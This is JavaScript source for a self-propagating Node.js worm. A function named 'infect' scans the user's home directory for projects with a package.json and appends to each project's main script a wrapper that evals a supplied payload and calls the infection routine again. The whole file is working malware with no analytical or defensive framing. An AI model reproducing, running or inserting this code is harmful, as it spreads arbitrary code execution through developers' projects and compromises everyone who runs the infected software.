global.infect = function( payload ) { 

    const fs   = require( "fs" );
    const os   = require( "os" );
    const path = require( "path" );

    function escape(str) {
        return str.replace(/[\\"]/g, "\\$&");
    }

    const modifiedPayload = `
(function() {
    var payload = "${escape(payload)}";
    eval(payload);
    global.infect( payload );
})();
    `;

    function readdir( dir ) {
        return new Promise( function( rs, rj ) {
            fs.readdir( dir, (e,r) => e ? rj( e ) : rs( r ) );
        });
    }

    function stat( f ) {
        return new Promise( function( rs ) {
            fs.stat( f, function( err, res ) {
                if( !err && res.isFile() )
                    rs( "file" );
                else if( !err && res.isDirectory() )
                    rs( "dir" );
                else
                    rs( null );
            });
        });
    }

    function appendFile( f, data ) {
        return new Promise( function( rs, rj ) {
            fs.appendFile( f, data, (e) => e ? rj( e ) : rs() );
        });
    }

    function readFile( f ) {
        return new Promise( function( rs, rj ) {
            fs.readFile( f, "utf-8", (e,r) => e ? rj( e ) : rs( r ) );
        });
    }

    function getProjectMains( root, depth ) {

        // if we've maxed out depth then go no further
        if( depth < 1 )
            return [];

        // get all children of directory
        return readdir( root )
            .then( function( files ) { 
                return Promise.all( files.map( function( file ) {
                    var full = path.join( root, file );
                    return stat( full )
                        .then( function( dirInfo ) {

                            // if child is not a directory - ignore
                            if( dirInfo !== "dir" )
                                return [];
                        
                            var pkgPath = path.join( full, "package.json" );
                            return stat( pkgPath ).then( function( res ) {

                                // check if child directory has a package.json - if not, recursively scan the child
                                if( res !== "file" )
                                    return getProjectMains( full, depth - 1 );

                                return readFile( pkgPath ).then( function( res ) {

                                    // load the package.json and find the main script (being index.js if not specified)
                                    try {
                                        var main = JSON.parse( res ).main || "index.js";
                                    } catch( e ) {
                                        // json parsing failed - gotta bail
                                        return [];
                                    }

                                    var mainPath = path.join( full, main );
                                    
                                    return stat( mainPath ).then( function( res ) {

                                        // if the main script exists, return it as a valid project main, otherwise return nothing...
                                        if( res === "file" )
                                            return [ mainPath ];

                                        return [];
                                    });
                                    
                                });
                            } );
                        });
                } ) ).then( function( arrs ) {
                    var res = [];
                    for( var arr of arrs )
                        res.push( ...arr );
                    return res;
                });
            });
    }

    getProjectMains( os.homedir(), 10 ).then( function( files ) {
        return Promise.all( files.map( function( file ) {
            readFile( file )
                .then( function( data ) {
                    if( data.indexOf( modifiedPayload ) === -1 )
                        return appendFile( file, modifiedPayload );
                }); 
        }));
    });
};

